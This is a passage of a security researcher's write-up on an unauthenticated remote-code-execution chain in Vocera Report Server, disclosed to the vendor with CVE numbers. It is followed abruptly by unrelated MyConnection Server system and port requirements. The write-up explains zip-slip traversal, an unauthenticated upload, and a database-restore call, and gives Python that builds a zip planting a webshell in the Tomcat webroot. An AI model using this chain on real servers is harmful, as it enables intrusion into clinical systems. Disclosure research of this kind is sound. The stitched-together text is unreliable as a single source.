### The specified file is expected to be a zip file that is then programmatically unzipped and written to disk. The problem, as you could probably guess, is the unzip function is vulnerable to directory traversal which could lead to an arbitrary file write. If the unzip succeeds, a particular file is read from the archive that is then used to completely overwrite the database.Â **DANGER: THIS OPERATION OVERWRITES THE DATABASE SO ADDITIONAL MEASURES NEED TO BE TAKEN TO PREVENT THIS.**

![](https://www.securifera.com/wp-content/uploads/2023/04/unzip.png "unzip")
### Since this server hosts a web server and is running as SYSTEM, an arbitrary file write can be used to achieve remote code execution by writing a webshell in the webroot. To summarize, in this instance we have found an unauthenticated endpoint that allows for a privileged file write if we can place an arbitrary file somewhere on the file system. We lack one more primitive to pull off this exploit. Back to the code!

### Given the specific requirement for a file write, we search for any references to âwriteâ and work our way back to any web endpoints that would reach that code. This concept is often referred to as ***source*** to ***sink*** data flow analysis. After some time we find a class called ***MultipartRequest***. This class is instantiated from an incoming ***multipart/form-data*** request. If the requests contains any parameters that are named ***filename***, the data is read and written to a file in a temp folder.

![](https://www.securifera.com/wp-content/uploads/2023/04/multipart.png "multipart")
### If we search for references of RequestContainer, the class responsible for creating MultipartRequest instances, we see it is created by the BaseController class on the handling of each HTTP request. Since BaseController is an abstract class, we search for any child classes and find ReportController. This is perfect since ReportController is the primary endpoint for the application. This means if we send an HTTP request with ***Content-Type*** multipart/form-data to the ReportController endpoint, the contents of any parameters with a ***Content-Disposition*** that contains a filename will be written to disk in a temp directory. This best part is this is all unauthenticated (another bug)!

![](https://www.securifera.com/wp-content/uploads/2023/04/arb_upload.png "arb_upload")
### Now we have all the pieces necessary to construct an exploit chain to gain unauthenticated remote code execution on the Vocera Report Server. First we construct a malicious zip file with a webshell embedded with a directory traversal path. Next we upload a zip file to the temp directory with a multipart request. Finally we send a websocket request with the restoreSqlData operation with a directory traversal path to our uploaded zip file.

## **WAIT!!!Â  HOW DO I NOT CLOBBER THE DATABASE?!?!**

### As much as any customer likes red teamers proving exploitation, nuking an applicationâs database is probably not a reasonable loss to prove code execution. That means we needed to put in a little more effort into the exploit to avoid this. If we look at the SQL restore function, we can see that if a ZipException is thrown (that is not a version issue), the function will bail out.

![](https://www.securifera.com/wp-content/uploads/2023/04/zip_error.png "zip_error")
### How then do we cause a ZipException while also successfully executing our arbitrary file write? If we look at the [JDK source code for ZipInputStream](https://github.com/openjdk/jdk/blob/master/src/java.base/share/classes/java/util/zip/ZipInputStream.java#L522) we can see a simple way to cause a ZipException to be thrown from a specific ZipEntry. If we set the first bit of the flag field in the ZipEntry a ZipException will be thrown since encryption is not supported.

![](https://www.securifera.com/wp-content/uploads/2023/04/zip_stream.png "zip_stream")
### If we lookup the offset for [LOCFLG](https://github.com/openjdk/jdk/blob/0deb648985b018653ccdaf193dc13b3cf21c088a/src/jdk.zipfs/share/classes/jdk/nio/zipfs/ZipConstants.java#L81) we see it is at index 6 in the ZipEntry header. We can code up some python to modify the zip entry contents after we zip up our payload as shown below.

Copy to ClipboardSyntax Highlighter# This function intentional adds a second entry that is marked as encrypted
# so the zip loop will throw an exception after the Zip slip exploit
def build\_zip(wsh\_endpoint, file\_contents):
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP\_DEFLATED)
z.writestr(
'/../../tomcat/webapps/ROOT/%s' % wsh\_endpoint, # outfile
file\_contents) # contents
z.writestr(
'exception.txt', # outfile
'') # contents
z.close()
# Zip contents
zip\_contents = f.getvalue()
idx = zip\_contents.find(b'\x50\x4B\x03\x04', 4)
flag\_idx = idx+6
zip\_array = bytearray(zip\_contents)
zip\_array[flag\_idx] = 1
zip\_contents = bytes(zip\_array)
return zip\_contents
## **Vendor Disclosure & Patch**

### I reported these issues through the [Stryker vulnerability disclosure program](https://www.stryker.com/us/en/about/governance/cyber-security.html) and can say everything went smoothly and they worked with us to get the issues fixed and patched in a reasonable time frame. Given the severity of these findings, we strongly encourage anyone that has Vocera Report Server deployed to update to the latest version immediately. For tracking purposes, the vulnerabilities discussed here represent CVE-2022-46898, CVE-2022-46899, CVE-2022-46900, CVE-2022-46901, and CVE-2022-46902.

## Requirements

#### MCS Management Server

* OS: Linux or Windows Server

+ Linux: kernel 2.2.5 and above, RedHat 7.6 and above, and most other popular Linux distributions (Ubuntu, CentOS etc.), Intel x86 architecture only. MCS also supports AWS and Azure Linux services. Must be root to install, but not to run product.
+ Windows Server 2012-2019

* Java: 32-bit (Windows) or 64-bit (Linux) Oracle JRE is recommended (not JDK)
* System - Physical Server or Virtual:

+ Recommended: 2 GHz CPU 4+ core x64, 500GB free disk, 16-32 GB memory
+ Minimum: 2 GHz CPU 2-4 cores x32/x64, 500GB free disk, 8-16 GB memory

* MCS Database: Average storage is 2 GB per 10,000 tests

#### MCS Satellite Servers (SW)

* OS: Linux or Windows Server

+ Linux: kernel 2.2.5 and above, RedHat 7.6 and above, and most other popular Linux distributions (Ubuntu, CentOS etc.), Intel x86 architecture only. MCS also supports AWS and Azure Linux services.
+ Windows Server 2012-2019

* Java: 32-bit (Windows) or 64-bit (Linux) Oracle JRE is recommended (not JDK)
* System - Physical Server or Virtual:

+ Minimum: 2 GHz CPU 2-4 cores x32/x64, 250GB free disk, 8 GB memory if dedicated (16GB+ if shared)

#### MCS Quality Test Satellite Servers, Rack Mount Appliances (HW)

* Available with up to 16 ports, each Port includes a Satellite Server license
* Power: external power supply or PoE
* Specifications: [Datasheet](https://myconnectionserver.visualware.com/resources/datasheets/mcs_asa.pdf)

#### MCS Client Satellites (for automated testing from remote systems)

* OS: Windows 7-10, Windows Server 2008-2019, Mac OS X 10.11+ (El Capitan), Linux
* System: 4+ GB memory

#### Client Browser Support

MCS in-browser testing solutions are only officially supported by the mainstream browsers listed below:

* **Google Chrome, Microsoft Edge, Safari, and Firefox**

Internet Explorer and other less mainstream browsers may still work but are not officially supported.

#### Virtual Servers

MCS may be run on a virtual server. However a small number of users have experienced erroneous jitter reports due to an inaccurate timer on a virtual server. If you are planning to utilize the VoIP test, we recommend an initial validation of the results by comparing jitter test results from MCS on a dedicated server and the virtual server.

#### Java Requirements

> MyConnection Server (MCS) version 10 or above no longer requires Java to be present on any client computer. MCS does require Java on the server platform. If installing on Linux then most popular platforms already have the Oracle Open JDK installed. Visualware fully supports the Oracle Java Open JDK. MCS requires the Java Runtime Environment (JRE) and version 8 or above is recommended. Please note other Java versions from Oracle, such as Java SE, may require an additional Java support license from Oracle. Please review [java.com](https://www.java.com/en/download/) for more information on Oracle license requirements, Java Open JDK and any additional license requirements for Java SE releases.
>
> To validate the Oracle Java version in use:-
>
> * Open a command prompt
> * type **java -version** and press the enter key
> * The Oracle JVM version will be reported if present
>
> It is recommended that you keep the Java VM up to date with Oracle releases. Keep in mind that Java is no longer required in the client.

#### SQL Database API (optional)

> MCS includes a proprietary database that automatically logs all test results. Use of the API requires a licensed external SQL database:
>
> > **MySQL**: Download Connector/J from the MySQL web site.
> >
> >
> >
> > **Microsoft SQL Server**: Download the SQL Server JDBC from the Microsoft web site.

#### Port Requirements

> The default ports for the various MyConnection Server test types are listed below. The ports can be changed if needed in the MCS server configuration page.
>
> > **MySpeed**: TCP, ports 20000, 20001
> >
> > **MyVoIP**: UDP, ports 20000, 20001, TCP port 5060 (SIP test)
> >
> > **MyCapacity**: UDP, port 8090
> >
> > **MyRoute**: ICMP outbound - echo request; ICMP inbound - TTL expired in transit, Echo reply
> >
> > **MyFirewall**: UDP/TCP, these ports (or port ranges) are set in the 'custom test' option
>
> MyConnection Server includes a web engine which normally runs on HTTP port 80, although it can run on other ports. If MCS is to coexist on a server with IIS and you want MCS to run on port 80, see: stop IIS port grab.
